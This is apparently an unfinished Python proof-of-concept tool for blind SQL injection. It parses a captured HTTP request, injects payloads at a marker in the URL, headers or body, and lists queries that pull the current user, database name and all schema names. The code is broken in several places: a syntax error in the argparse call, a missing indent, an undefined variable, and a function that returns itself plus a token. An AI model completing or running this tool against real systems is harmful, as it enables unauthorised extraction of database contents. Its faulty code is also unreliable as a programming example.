from pwn import *
from urllib.parse import urljoin
import requests, sys, time, string, argparse

class RequestParser:
    def __init__(self, file, ssl=False, marker="*"):
        self.file = file
        self.ssl = ssl
        self.marker = marker
        self.method = "GET"
        self.url = ""
        self.headers = {}
        self.body = ""

    def parse_file(self):
        with open(self.file, "r", encoding="utf-8") as f:
            content = f.read()

        # Separate HTTP header block and body
        if "\n\n" in content:
            parts = content.split("\n\n", 1)
        else:
            parts = [content, ""]

        header_block = parts[0]
        # Remove trailing newline characters from request body
        self.body = parts[1].strip() if len(parts) > 1 else ""

        # Process individual header lines as strings
        lines = [line.strip() for line in header_block.splitlines() if line.strip()]
        if not lines:
            raise ValueError("Request file is empty.")

        # Parse Request Line (e.g., "POST /resetPassword.php HTTP/1.1")
        request_line = lines[0].split()
        self.method = request_line[0].upper()
        endpoint = request_line[1]

        # Parse HTTP Headers into dictionary
        self.headers = {}
        for line in lines[1:]:
            if ":" in line:
                key, value = line.split(":", 1)
                self.headers[key.strip()] = value.strip()

        # Reconstruct base URL preserving port numbers from Host header
        host = self.headers.get("Host", "localhost")
        scheme = "https" if self.ssl else "http"
        self.url = urljoin(f"{scheme}://{host}", endpoint)

    def prepare_request(self, payload):
        current_url = self.url
        current_headers = self.headers.copy()
        current_body = self.body

        # URL Injection
        if self.marker in current_url:
            current_url = current_url.replace(self.marker, payload)

        # Headers Injection
        for key, value in current_headers.items():
            if self.marker in value:
                current_headers[key] = value.replace(self.marker, payload)

        # Body Injection
        if self.marker in current_body:
            current_body = current_body.replace(self.marker, payload)

        return {
            "method": self.method,
            "url": current_url,
            "headers": current_headers,
            "data": current_body
            }

def args():
    parser = argparse.ArgumentParser(
        description = "PoC script"
        epilog = "Usage example: python3 blind_extractor.py -f request.txt"
        )

    # Definition of argumets
    parser.add_argument("-f", "--file", type=str, help="Target File (request.txt)")
    args = parser.parse_args()

    # Basic validation
    if not args.file:
    parser.error("File is required (-f)")
        
    request = RequestParser(args.file)
    request.parse_file()
    data = request.prepare_request(payload)

    return request

def search(token):
    search1 = "user()"
    search2 = "database()"
    search3 = "select group_concat(schema_name) from information_schema.schemata"

    return search + token
